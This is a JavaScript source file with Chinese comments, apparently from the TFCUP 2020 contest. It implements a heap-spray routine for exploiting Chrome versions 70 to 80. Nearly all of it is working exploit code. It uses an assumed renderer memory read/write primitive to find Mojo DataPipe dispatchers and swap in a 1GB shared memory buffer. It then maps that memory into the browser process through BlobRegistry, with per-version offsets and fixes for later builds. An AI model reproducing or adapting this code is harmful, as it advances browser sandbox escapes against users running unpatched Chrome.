// TFCUP 2020的堆喷代码，map内存，不会直接占用内存。
// 在80.0.3987.149之后，64位chrome被限制只能喷32G（？），需要配合堆地址泄漏使用，以前随意
// 70.0-80.0.3987.149
// 堆喷补丁：commit a4a2d4b21eaca030d304f5fd9f19ede848108c47


/*
对应源码在mojo/core下
blob_registry.mojom.cc在编译生成目录/gen下（很多生成的mojom接口cc都在/gen）
在mojo中对应的符号：
blink::MojoHandle
mojo::core::DataPipeConsumerDispatcher
*/

//简单的交换
function memswap(rce, src, dst, size){
    var i = 0n;
    while (size - i > 4n) {
      var tmp = rce.read32(dst + i);
      var tmp2 =rce.read32(src + i);
      rce.write32(dst + i, tmp2);
      rce.write32(src + i, tmp);
      i += 4n;
    }
}


function get_mojo_handle(rce, object) { // 获取MojoHandle，每个版本的偏移可能有变化
  let object_ptr = rce.leakPtr(object) - 1n;
  let object_handle_ptr = rce.read64(object_ptr + 0x14n);//0x14 80.0
  let object_handle = rce.read32(object_handle_ptr + 0x10n);//0x10 80.0
  return object_handle;
}

function spray(rce, page_data) {

  const kPageSize     = 0x1000; //以0x1000为一个page，填满一个huge page
  const kHugePageSize = 0x40000000; //喷射的单位是1G

// shared memory存放huge page
  let shared_memory = Mojo.createSharedBuffer(kHugePageSize).handle;
  let shared_memory_handle = get_mojo_handle(rce, shared_memory);
  var page_view = new DataView(page_data);
  for (var i = 0; i < kHugePageSize / kPageSize; i += 1) {
    let shared_buffer = shared_memory.mapBuffer(i * kPageSize, kPageSize);
    let shared_view = new DataView(shared_buffer.buffer);
    for (var j = 0; j < kPageSize; j += 4) {
      shared_view.setUint32(j, page_view.getUint32(j));
    }
  }
  //创建容量0x1000大小的DataPipe，并获取对应的MojoHandle
  let pipes = [];
  let dupes = [];
  let pipe_handles = new Set([]);
  let dupe_handles = new Set([]);
  force_gc();
  for (var i = 0; i < kSprayPageNum; ++i) { // kSprayPageNum 控制堆喷射的数量
    let pipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: 0x1000});
    let dupe = shared_memory.duplicateBufferHandle();
    let pipe_handle = get_mojo_handle(rce, pipe.consumer);
    let dupe_handle = get_mojo_handle(rce, dupe.handle); 
    pipes.push(pipe);
    dupes.push(dupe);
    pipe_handles.add(pipe_handle);
    dupe_handles.add(dupe_handle);
  }
// 通过mojo core寻找DataPipe对应的Dispatcher  
    let mojo_core_ptr = rce.read64(CHROME_CHILD_CORE); // chrome_child!g_core
    let mojo_handles_ptr = rce.read64(mojo_core_ptr + 0x20n);  
    let pipe_dispatchers = [];
    let dupe_dispatchers = [];
    let list_node_ptr = rce.read64(mojo_handles_ptr + 0x18n);
    let list_length = rce.read32(mojo_handles_ptr + 0x20n);
    
  for (var i = 0; i < list_length; ++i) {
    let list_node_handle = rce.read32(list_node_ptr + 0x10n);
    let list_node_dispatcher = rce.read64(list_node_ptr + 0x18n);
    if (pipe_handles.has(list_node_handle)) {
      pipe_dispatchers.push(list_node_dispatcher);
    } else if (dupe_handles.has(list_node_handle)) {
      dupe_dispatchers.push(list_node_dispatcher);
    }
    
    let tmp_list_node_ptr = rce.read64(list_node_ptr);
    list_node_ptr = rce.read64(list_node_ptr);
  }
  
// 找到之后，更换DataPipe的内容shared memory，修改Dispatcher的capacityNumBytes为shared memory大小
  for (var i = 0; i < pipe_dispatchers.length && i < dupe_dispatchers.length; ++i) {
    memswap(rce, pipe_dispatchers[i] + 0x80n,
                dupe_dispatchers[i] + 0x20n,
                0x28n);
    rce.write32(pipe_dispatchers[i] + 0x18n, kHugePageSize);
    rce.write32(pipe_dispatchers[i] + 0x1cn, kHugePageSize); 
    /*
        目前发现此处两句在M83的某个版本会出问题，可以修改为
        rce.write64(pipe_dispatchers[i] + 0x18n, kHugePageSize+kHugePageSize<<0x20);
        原因在于V8 oob的write32实际上是write64，高位为0，导致覆盖后面的数据
    */
  }

  let ab = new ArrayBuffer(1);
  // 通过BlobRegistry.registerFromStream来map内存
  for (var i = 0; i < pipes.length; ++i) {    
    blob_registry_ptr2 = new blink.mojom.BlobRegistryPtr();
    Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                     mojo.makeRequest(blob_registry_ptr2).handle, "process", true)
    blob_registry_ptr2.registerFromStream("", "", 0x1, pipes[i].consumer, null);
    pipes[i].producer.writeData(ab);
  }

// cleanup
  return () => {
    let ab = new ArrayBuffer(0xfff);
    for (var i = 0; i < pipes.length; ++i) {
      pipes[i].producer.writeData(ab);
    }

    for (var i = 0; i < pipes.length; ++i) {
      pipes[i].producer.close();
    }

    for (var i = 0; i < dupes.length; ++i) {
      dupes[i].handle.close();
    }
  };
}

